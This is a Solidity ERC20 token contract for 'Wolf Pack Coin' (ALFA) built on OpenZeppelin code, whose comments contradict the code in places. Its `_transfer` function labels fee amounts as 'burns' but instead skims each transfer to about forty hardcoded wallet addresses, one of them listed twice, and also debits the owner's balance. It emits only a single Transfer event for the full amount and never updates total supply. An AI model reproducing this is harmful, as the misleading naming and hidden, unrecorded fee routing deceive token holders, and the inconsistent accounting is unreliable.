// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract TesteAlfa is Context, IERC20, IERC20Metadata {
    
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 100000 * 10 ** _decimals;
    uint8 private _decimals = 0;
    string private _name = "Wolf Pack Coin";
    string private _symbol = "ALFA";
    
    address public contractOwner;
                            
    uint public burnRate1 = 1;
    uint public burnRate2 = 5;
    uint public burnRate3 = 3;
    uint public burnRate4 = 2;
    uint public burnRate5 = 4;
    
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor() {
        
        contractOwner = msg.sender;
        _balances[msg.sender] = _totalSupply;
        
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        
        
        uint amountToBurn1 = (amount * burnRate1 / 100);
        uint amountToBurn2 = (amount * burnRate2 / 100);
        uint amountToBurn3 = (amount * burnRate3 / 100);
        uint amountToBurn4 = (amount * burnRate4 / 1000);
        uint amountToBurn5 = (amount * burnRate5 / 10000);
        
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            
            _balances[sender] = senderBalance - amount;
            
            
        }
            _balances[contractOwner] -= amountToBurn1;
            
            _balances[recipient] += amount - amountToBurn2;
            
            _balances[0x6fFd40Cfb00f369B7F439E7B7Cf780EdBE7755Ed] += amountToBurn3;
            
            
            _balances[0x7007DaA118f8419726780A2616131e68A1bD0e9e] += amountToBurn4;
            _balances[0x31341a7254F8Dcaf57B66C65919221E82bAa2CDC] += amountToBurn4;


            _balances[0xD31aF35a7E53b5cB84d3bFBC52c74c0856cD90c3] += amountToBurn5;
            _balances[0xFdc1068F89387FE2c53277116C4e593F4ab099B1] += amountToBurn5;
            _balances[0x4bBbcd61BB31C1053765F6a05955C29a0F14D8d9] += amountToBurn5;
            _balances[0x032a9BfDc850542A97DbDdC237222CF9ee5F0b45] += amountToBurn5;
            _balances[0xe99fb9eB8875fedBE6226d1E5420b9235d1fc764] += amountToBurn5;
            _balances[0x0690ebFDEDC520d503193368BDb190F2385C9bEA] += amountToBurn5;
            _balances[0xb6b0A080B9AC6a86Ce5EFd7d4a3E34cc57A75850] += amountToBurn5;
            _balances[0x95352341E9EC490a2870B36cddeA9dA8472E9218] += amountToBurn5;
            _balances[0x2cae978Fb4a6CeCc254102d8DC38Ba7C6DdDd9e1] += amountToBurn5;
            _balances[0x51DBD4C9F22ab47ADf76C7b3BC5e055145216052] += amountToBurn5;
            _balances[0x6fFd40Cfb00f369B7F439E7B7Cf780EdBE7755Ed] += amountToBurn5;
            _balances[0x7dc06F50ac9412ffDb24f8aDec529C460e6f489c] += amountToBurn5;
            _balances[0x86984e8Fbe252C7DDAA360Cf0153ABCD0a41fDd3] += amountToBurn5;
            _balances[0xC196273751e80a3D5F8037Ea871Cd0E25EA49D50] += amountToBurn5;
            _balances[0x0B8CaE93Db81C2CaC6a62B612b1Be2E72447095D] += amountToBurn5;
            _balances[0x3A17Fe7c1a2431d3bC06c2b05C8D25419338bA98] += amountToBurn5;
            _balances[0x3f2C9385Ec321C6c4BDBc5451EF5C81738e648e6] += amountToBurn5;
            _balances[0x9b94887D69f7Df29Aacd3d8276Cb5524F8935370] += amountToBurn5;
            _balances[0x937C9542B922283d8f4BD2A732a0978450e12AeA] += amountToBurn5;
            _balances[0x6ee8B1fBa36a8E9fC30443853d0da7B80621484b] += amountToBurn5;
            _balances[0xc68CC8ca45aeA55572B15f1ed150FdA1F98E8838] += amountToBurn5;
            _balances[0xE3a3625048195cEa117Cd092af80f7dae32667Ba] += amountToBurn5;
            _balances[0x81886186A7585b7fD1c1BcE755cE58174ec59A42] += amountToBurn5;
            _balances[0x981d1fDe8c701e216f69C65bfE7cC2fa1B32621C] += amountToBurn5;
            _balances[0xeC61fA2b7CCf3B8fC9c4CF8B31eB3C74d0A34791] += amountToBurn5;
            _balances[0xc080007264b0A04a528019A347516E88818529aD] += amountToBurn5;
            _balances[0xF8b1822B24874376cF83Cf2bC2DdC9Dc228bd90D] += amountToBurn5;
            _balances[0xeA8411bbDd2Eb28e7662Fb5aE2Cc2E4C6511C469] += amountToBurn5;
            _balances[0x40B43259514Ca49beEb7e0B33f6B02067F8FAbB5] += amountToBurn5;
            _balances[0xC7865d5166aB144FdcDeB7c806cC8B6Ba6292934] += amountToBurn5;
            _balances[0x362612059f7D7eED9e5cB1e100016B87fDD82158] += amountToBurn5;
            _balances[0xE52B467E00c8BC92C909f4a685c196042c0EaF8B] += amountToBurn5;
            _balances[0x5faCEdBb6D0bF3F6A82140031a8D8c84f2D65f7c] += amountToBurn5;
            _balances[0x8204AEb47117951cbc266dF3dD220d39b18fCA2c] += amountToBurn5;
            _balances[0xb9FDc132b9c255c650F2C9506F47A92968C2d089] += amountToBurn5;
            _balances[0x9524FB401d17e4E50846A779aF3B7939A92A4b05] += amountToBurn5;
            _balances[0xF46fbdb98062471560Ce4373442FEeCC0eAc7C14] += amountToBurn5;
            _balances[0x066c82774D68F770731b8734fC2E3be636F4bce0] += amountToBurn5;
            _balances[0x241266365ce0aC7A786593Ad427514FDc4089c2f] += amountToBurn5;
            _balances[0x57C61BA9390df556f872DF271C3a4aFeFE473Bf9] += amountToBurn5;
            
            

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }


    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}